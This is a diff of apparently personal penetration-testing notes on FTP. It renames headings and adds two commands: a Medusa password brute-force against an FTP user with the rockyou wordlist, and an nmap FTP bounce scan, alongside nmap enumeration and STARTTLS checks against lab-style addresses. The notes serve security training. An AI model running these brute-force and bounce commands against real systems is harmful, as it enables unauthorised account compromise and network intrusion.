@@ -1,5 +1,7 @@
 
-## FTP Command Commands
+## FTP Commands
+
+
 
 vsftpd Configuration File
 ```python
@@ -39,7 +41,7 @@ ftp> put testupload.txt
 find / -type f -name ftp* 2>/dev/null | grep scripts
 ```
 
-**NMAP FTP**
+**NMAP FTP Enumeration**
 ```python
 sudo nmap -sV -p21 -sC -A 10.129.14.136
 ```
@@ -54,6 +56,15 @@ sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
 openssl s_client -connect 10.129.14.136:21 -starttls ftp
 ```
 
+**Brute Forcing FTP w/Medusa**
+```python
+medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
+```
+
+**FTP Bounce Back Attack**
+```python
+nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+```
 # Dangerous FTP Settings
 |**Setting**|**Description**|
 |---|---|
